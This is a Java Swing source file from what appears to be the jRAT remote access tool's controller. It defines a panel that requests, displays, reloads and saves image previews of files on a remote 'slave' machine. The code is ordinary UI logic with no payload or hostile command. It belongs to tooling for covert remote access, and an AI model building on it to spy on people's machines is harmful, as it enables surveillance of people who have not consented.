package jrat.module.fs.ui.previews;

import jrat.api.Resources;
import jrat.controller.Slave;
import jrat.controller.ui.panels.PanelImage;
import jrat.module.fs.packets.Packet62PreviewImage;

import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;


@SuppressWarnings("serial")
public class PanelPreviewImage extends PreviewPanel<BufferedImage> {

	private String file;

	private PanelImage imagePanel;
	private JButton btnReloadImage;

	public PanelPreviewImage(Slave slave, String f) {
		super(slave, "Image Preview - " + f, Resources.getIcon("image"));
		this.file = f;
		this.slave = slave;

		setBorder(new EmptyBorder(5, 5, 5, 5));

		JPanel panel = new JPanel();
		panel.setBorder(BorderFactory.createLineBorder(Color.gray.brighter()));

		btnReloadImage = new JButton("Reload Image");
		btnReloadImage.setEnabled(false);
		btnReloadImage.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				reload();
				btnReloadImage.setEnabled(false);
			}
		});
		btnReloadImage.setIcon(Resources.getIcon("update"));

		JButton btnSave = new JButton("Save");
		btnSave.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				JFileChooser c = new JFileChooser();
				c.showSaveDialog(null);
				File file = c.getSelectedFile();
				if (file != null) {
					try {
						ImageIO.write(imagePanel.getBufferedImage(), "png", file);
					} catch (IOException e) {
						JOptionPane.showMessageDialog(null, "Error saving image: " + e.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
						e.printStackTrace();
					}
				}
			}
		});
		btnSave.setIcon(Resources.getIcon("save"));
		GroupLayout gl_contentPane = new GroupLayout(this);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(btnReloadImage).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnSave).addGap(342)).addGroup(gl_contentPane.createSequentialGroup().addComponent(panel, GroupLayout.DEFAULT_SIZE, 532, Short.MAX_VALUE).addContainerGap()));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(Alignment.TRAILING, gl_contentPane.createSequentialGroup().addComponent(panel, GroupLayout.DEFAULT_SIZE, 291, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(btnReloadImage).addComponent(btnSave)).addGap(10)));
		panel.setLayout(new BorderLayout(0, 0));

		imagePanel = new PanelImage();
		panel.add(imagePanel, BorderLayout.CENTER);
		setLayout(gl_contentPane);

		reload();
	}

	public void addData(BufferedImage image) {
        imagePanel.image = image;
        imagePanel.repaint();

        btnReloadImage.setEnabled(true);
    }

	public void reload() {
		slave.addToSendQueue(new Packet62PreviewImage(file));
	}
}
